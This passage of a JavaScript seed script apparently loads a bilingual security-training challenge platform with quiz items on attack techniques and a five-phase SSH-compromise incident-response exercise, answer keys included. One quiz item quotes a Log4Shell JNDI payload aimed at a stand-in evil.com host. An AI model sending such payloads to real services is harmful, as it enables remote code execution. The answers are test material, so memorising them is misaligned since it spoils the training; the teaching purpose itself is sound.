  { t: 'Log Tampering', tf: 'Altération de journaux', d: 'Logs show a 3-hour gap during the time of a known breach. What happened?', a: 'LogTampering', p: 300 },
  { t: 'DLL Hijacking', tf: 'Détournement de DLL', d: 'A legitimate exe tries to load version.dll from its folder. A malicious version.dll exists. What is this?', a: 'DLLHijacking', p: 300 },
  { t: 'Bootkit', tf: 'Bootkit', d: 'A modified Master Boot Record loads malware before the OS boots. What type?', a: 'Bootkit', p: 300 },
  { t: 'Fileless Malware', tf: 'Malware sans fichier', d: 'No malicious files on disk, but processes show injected code and anomalous connections. What type?', a: 'FilelessMalware', p: 300 },
  { t: 'LSASS Dump', tf: 'Extraction LSASS', d: 'A tool accesses lsass.exe process memory and extracts credentials. What tool?', a: 'Mimikatz', p: 300 },
];
const techHard = [
  { t: 'Full Attack Chain', tf: 'Chaîne d\'attaque complète', d: 'Phishing -> Cobalt Strike -> Process hollowing -> LSASS dump -> PsExec to DC. What is the final goal?', a: 'DomainCompromise', p: 400 },
  { t: 'Kernel Rootkit', tf: 'Rootkit noyau', d: 'Process appears differently in Task Manager vs Process Explorer. Registry reads are intercepted. What is present?', a: 'KernelRootkit', p: 400 },
  { t: 'DNS Exfiltration', tf: 'Exfiltration DNS', d: 'Server sends DNS queries with base64-encoded subdomains to yourdomain.evil.com. What technique?', a: 'DNSExfiltration', p: 400 },
  { t: 'MITRE ATT&CK', tf: 'MITRE ATT&CK', d: 'T1566 -> T1059 -> T1003 -> T1021. What framework?', a: 'MITRE ATT&CK', p: 400 },
  { t: 'Anti-Sandbox', tf: 'Anti-sandbox', d: 'Malware checks: 128MB RAM, VMware NIC, debugger attached. All true -> sleeps. What evasion?', a: 'AntiSandbox', p: 400 },
  { t: 'Chain of Custody', tf: 'Chaîne de traçabilité', d: 'Hard drive collected but nobody documented who accessed it. What principle is broken?', a: 'ChainOfCustody', p: 400 },
  { t: 'Image Steganography', tf: 'Stéganographie d\'image', d: 'An image innocent.jpg (15MB for 1920x1080) contains hidden ZIP data. What technique?', a: 'ImageSteganography', p: 400 },
  { t: 'AD Privilege Escalation', tf: 'Élévation de privilèges AD', d: 'Standard user runs BloodHound and finds a path to Domain Admin via nested group memberships. What attack?', a: 'ADPrivEsc', p: 400 },
  { t: 'Container Escape', tf: 'Évasion de conteneur', d: 'Docker container with --privileged flag mounts the host filesystem. What vulnerability?', a: 'ContainerEscape', p: 400 },
  { t: 'IDOR Vulnerability', tf: 'Vulnérabilité IDOR', d: 'API shows GET /api/v1/users/1,2,3 returning other users\' data. What vulnerability?', a: 'IDOR', p: 400 },
  { t: 'Log4Shell Exploit', tf: 'Exploit Log4Shell', d: 'Attacker sends `${jndi:ldap://evil.com/a}` in a User-Agent header. What vulnerability?', a: 'Log4Shell', p: 400 },
  { t: 'Ransomware Response', tf: 'Réponse à un rançongiciel', d: 'Critical server encrypting files and displaying Bitcoin ransom note. What is the first containment step?', a: 'IsolateHost', p: 400 },
  { t: 'Threat Hunting', tf: 'Chasse aux menaces', d: 'Searching for processes with `-enc` or `-EncodedCommand` flags. What technique is this hunting for?', a: 'PowerShellAbuse', p: 400 },
];

// ============================================================
// PHASE 3: Incident Response (same as before)
// ============================================================
const irChallenge = {
  id: 41, type: 'incident_response', difficulty: 'hard', points: 1000,
  category: 'Incident Response',
  title: 'Server Compromise - SSH Brute Force Attack',
  title_fr: 'Compromission de serveur - Attaque par force brute SSH',
  description: 'A production web server (10.0.1.15) has been compromised. Investigate the alert, identify the attacker activity, contain the threat, and close the incident by following the five-phase SOP.',
  description_fr: 'Un serveur web de production (10.0.1.15) a été compromis. Enquêtez sur l\'alerte, identifiez l\'activité de l\'attaquant, contenez la menace et clôturez l\'incident en suivant la procédure en cinq phases.',
  answer: 'Complete all 5 phases',
  hints: JSON.stringify(['Start with authentication logs', 'Correlate processes and connections', 'Review scheduled tasks'])
};
const irPhases = [
  { challenge_id: 41, phase_number: 1, title: 'Alert Triage & Initial Analysis', title_fr: 'Tri d\'alerte et analyse initiale', description: 'Review the SIEM alert and authentication log. Confirm the affected asset, attack type, source address, and compromised account.', description_fr: 'Examinez l\'alerte SIEM et le journal d\'authentification. Confirmez l\'actif affecté, le type d\'attaque, l\'adresse source et le compte compromis.', points: 500, required_fields: JSON.stringify([{name:'attack_type',label:'Attack Type',answer:'BruteForce',label_fr:'Type d\'attaque'},{name:'source_ip',label:'Source IP Address',answer:'192.168.1.100',label_fr:'Adresse IP source'},{name:'compromised_account',label:'Compromised Account',answer:'admin',label_fr:'Compte compromis'}]) },
  { challenge_id: 41, phase_number: 2, title: 'Process & Connection Analysis', title_fr: 'Analyse des processus et connexions', description: 'Correlate the suspicious outbound connection with the process list to identify the malicious PID, process name, C2 address, and port.', description_fr: 'Corrélez la connexion sortante suspecte avec la liste des processus pour identifier le PID, le nom du processus, l\'adresse C2 et le port.', points: 750, required_fields: JSON.stringify([{name:'malicious_pid',label:'Malicious PID',answer:'1337',label_fr:'PID malveillant'},{name:'process_name',label:'Process Name',answer:'.systemd-monitor',label_fr:'Nom du processus'},{name:'c2_ip',label:'C2 IP Address',answer:'185.220.101.5',label_fr:'Adresse IP C2'},{name:'c2_port',label:'C2 Port',answer:'4444',label_fr:'Port C2'}]) },
  { challenge_id: 41, phase_number: 3, title: 'Command & File Forensics', title_fr: 'Analyse des commandes et fichiers', description: 'Inspect shell history, dropped files, and scheduled tasks to determine how the attacker established persistence.', description_fr: 'Inspectez l\'historique du shell, les fichiers déposés et les tâches planifiées pour déterminer comment l\'attaquant a établi sa persistance.', points: 1000, required_fields: JSON.stringify([{name:'persistence_method',label:'Persistence Method',answer:'Crontab',label_fr:'Méthode de persistance'},{name:'malicious_file_path',label:'Malicious File Path',answer:'/tmp/.hidden_miner',label_fr:'Chemin du fichier'},{name:'cron_schedule',label:'Cron Schedule',answer:'*/5 * * * *',label_fr:'Programmation cron'}]) },
  { challenge_id: 41, phase_number: 4, title: 'Practical Remediation & Containment', title_fr: 'Remédiation et confinement', description: 'Terminate the malicious process, block the C2 address, and remove the persistence mechanism.', description_fr: 'Terminez le processus malveillant, bloquez l\'adresse C2 et supprimez le mécanisme de persistance.', points: 1500, required_fields: JSON.stringify([{name:'kill_command',label:'Termination Command',answer:'kill 1337',label_fr:'Commande d\'arrêt'},{name:'c2_block_command',label:'C2 Block Command',answer:'iptables -A OUTPUT -d 185.220.101.5 -j DROP',label_fr:'Blocage C2'},{name:'persistence_remove_command',label:'Remove Persistence',answer:'crontab -r',label_fr:'Supprimer persistance'}]) },
  { challenge_id: 41, phase_number: 5, title: 'IR Summary & Incident Closure', title_fr: 'Résumé et clôture d\'incident', description: 'Summarize the root cause, confirm remediation, and submit the primary indicators of compromise.', description_fr: 'Résumez la cause racine, confirmez la remédiation et soumettez les indicateurs de compromission principaux.', points: 1250, required_fields: JSON.stringify([{name:'root_cause',label:'Root Cause',answer:'SSH Brute Force',label_fr:'Cause racine'},{name:'primary_ioc',label:'Primary IOC',answer:'185.220.101.5',label_fr:'IOC principal'},{name:'remediation_status',label:'Remediation Status',answer:'Complete',label_fr:'État de la remédiation'}]) },
];

function makeHints(list) {
  const labels = list.split(',');
  return JSON.stringify(labels.map((l, i) => ({ value: String.fromCharCode(65 + i), label: l })));
}

async function seedChallenges() {
  // Clear old data
  await run('DELETE FROM challenges');
  await run('DELETE FROM submissions');
  await run('DELETE FROM phase_submissions');
  await run('DELETE FROM phases');
  await run('DELETE FROM question_pool');
  console.log('  Old data cleared.');

  let cid = 1;
  const defaultHints = JSON.stringify(['Examine the logs', 'Look for patterns', 'Identify the malicious activity']);

  // Phase 1: MC questions (easy, medium, hard)
  console.log('Creating Phase 1: Multiple Choice questions...');
  for (const q of mcEasy) {
    await run('INSERT INTO challenges (id,type,title,title_fr,description,description_fr,points,category,answer,hints,difficulty,phase_number,is_active) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?) ON CONFLICT(id) DO UPDATE SET type=excluded.type,title=excluded.title,title_fr=excluded.title_fr,description=excluded.description,description_fr=excluded.description_fr,points=excluded.points,category=excluded.category,answer=excluded.answer,hints=excluded.hints,difficulty=excluded.difficulty,phase_number=excluded.phase_number,is_active=excluded.is_active',
      [cid++, 'multiple_choice', q.t, q.tf, q.d, q.df, q.p, q.cat, q.a, makeHints(q.o), 'easy', 1, 1]);
  }
  for (const q of mcMedium) {
    await run('INSERT INTO challenges (id,type,title,title_fr,description,description_fr,points,category,answer,hints,difficulty,phase_number,is_active) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?) ON CONFLICT(id) DO UPDATE SET type=excluded.type,title=excluded.title,title_fr=excluded.title_fr,description=excluded.description,description_fr=excluded.description_fr,points=excluded.points,category=excluded.category,answer=excluded.answer,hints=excluded.hints,difficulty=excluded.difficulty,phase_number=excluded.phase_number,is_active=excluded.is_active',
      [cid++, 'multiple_choice', q.t, q.tf, q.d, q.df, q.p, q.cat, q.a, makeHints(q.o), 'medium', 1, 1]);
  }
  for (const q of mcHard) {
    await run('INSERT INTO challenges (id,type,title,title_fr,description,description_fr,points,category,answer,hints,difficulty,phase_number,is_active) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?) ON CONFLICT(id) DO UPDATE SET type=excluded.type,title=excluded.title,title_fr=excluded.title_fr,description=excluded.description,description_fr=excluded.description_fr,points=excluded.points,category=excluded.category,answer=excluded.answer,hints=excluded.hints,difficulty=excluded.difficulty,phase_number=excluded.phase_number,is_active=excluded.is_active',
      [cid++, 'multiple_choice', q.t, q.tf, q.d, q.df, q.p, q.cat, q.a, makeHints(q.o), 'hard', 1, 1]);
  }
  console.log(`  Inserted ${mcEasy.length + mcMedium.length + mcHard.length} MC questions (EN/FR)`);

  // Phase 2: Technical/Practical questions
  console.log('Creating Phase 2: Technical challenges...');
  for (const q of techEasy) {
    await run('INSERT INTO challenges (id,type,title,title_fr,description,description_fr,points,category,answer,hints,difficulty,phase_number,is_active) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?) ON CONFLICT(id) DO UPDATE SET type=excluded.type,title=excluded.title,title_fr=excluded.title_fr,description=excluded.description,description_fr=excluded.description_fr,points=excluded.points,category=excluded.category,answer=excluded.answer,hints=excluded.hints,difficulty=excluded.difficulty,phase_number=excluded.phase_number,is_active=excluded.is_active',
      [cid++, 'practical', q.t, q.tf, q.d, q.d, q.p, 'Technical Analysis', q.a, defaultHints, 'easy', 2, 1]);
  }
  for (const q of techMedium) {
    await run('INSERT INTO challenges (id,type,title,title_fr,description,description_fr,points,category,answer,hints,difficulty,phase_number,is_active) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?) ON CONFLICT(id) DO UPDATE SET type=excluded.type,title=excluded.title,title_fr=excluded.title_fr,description=excluded.description,description_fr=excluded.description_fr,points=excluded.points,category=excluded.category,answer=excluded.answer,hints=excluded.hints,difficulty=excluded.difficulty,phase_number=excluded.phase_number,is_active=excluded.is_active',
      [cid++, 'practical', q.t, q.tf, q.d, q.d, q.p, 'Technical Analysis', q.a, defaultHints, 'medium', 2, 1]);
  }
  for (const q of techHard) {
    await run('INSERT INTO challenges (id,type,title,title_fr,description,description_fr,points,category,answer,hints,difficulty,phase_number,is_active) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?) ON CONFLICT(id) DO UPDATE SET type=excluded.type,title=excluded.title,title_fr=excluded.title_fr,description=excluded.description,description_fr=excluded.description_fr,points=excluded.points,category=excluded.category,answer=excluded.answer,hints=excluded.hints,difficulty=excluded.difficulty,phase_number=excluded.phase_number,is_active=excluded.is_active',
      [cid++, 'practical', q.t, q.tf, q.d, q.d, q.p, 'Technical Analysis', q.a, defaultHints, 'hard', 2, 1]);
  }
  console.log(`  Inserted ${techEasy.length + techMedium.length + techHard.length} Technical challenges (EN/FR)`);

  // Phase 3: Incident Response
  console.log('Creating Phase 3: Incident Response...');
  const c = irChallenge;
  await run('INSERT INTO challenges (id,type,title,title_fr,description,description_fr,points,category,answer,hints,difficulty,phase_number,is_active) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?) ON CONFLICT(id) DO UPDATE SET type=excluded.type,title=excluded.title,title_fr=excluded.title_fr,description=excluded.description,description_fr=excluded.description_fr,points=excluded.points,category=excluded.category,answer=excluded.answer,hints=excluded.hints,difficulty=excluded.difficulty,phase_number=excluded.phase_number,is_active=excluded.is_active',
    [c.id, c.type, c.title, c.title_fr, c.description, c.description_fr, c.points, c.category, c.answer, c.hints, c.difficulty, 3, 1]);
  console.log('  41. ' + c.title + ' / ' + c.title_fr);

  await run('DELETE FROM phases WHERE challenge_id = 41');
  for (const p of irPhases) {
    await run('INSERT INTO phases (challenge_id,phase_number,title,title_fr,description,description_fr,target_objective,required_fields,points) VALUES (?,?,?,?,?,?,?,?,?)',
      [p.challenge_id, p.phase_number, p.title, p.title_fr, p.description, p.description_fr, p.title, p.required_fields, p.points]);
  }
  console.log('  5 incident response phases created with EN/FR');
}

async function seedTestData() {
  try {
    await createTestTeams();
    await seedChallenges();
    const teamCount = await get('SELECT COUNT(*) as count FROM teams');
    const userCount = await get('SELECT COUNT(*) as count FROM users WHERE role = "player"');
    const challengeCount = await get('SELECT COUNT(*) as count FROM challenges WHERE is_active = 1');
    const phaseCount = await get('SELECT COUNT(*) as count FROM phases');
    const mcCount = await get('SELECT COUNT(*) as count FROM challenges WHERE phase_number = 1');
    const techCount = await get('SELECT COUNT(*) as count FROM challenges WHERE phase_number = 2');
    console.log(`\nSummary: Teams=${teamCount.count}, Players=${userCount.count}, Challenges=${challengeCount.count}, Phases=${phaseCount.count}`);
    console.log(`  Phase 1: ${mcCount.count} MC questions (EN/FR)`);
    console.log(`  Phase 2: ${techCount.count} Technical challenges (EN/FR)`);
    console.log(`  Phase 3: 1 Incident Response with 5 phases (EN/FR)`);
  } catch (error) {
    console.error('Failed:', error);
    throw error;
  }
}

if (require.main === module) {
  seedTestData().then(() => process.exit(0)).catch(e => { console.error(e); process.exit(1); });
}
module.exports = { seedTestData };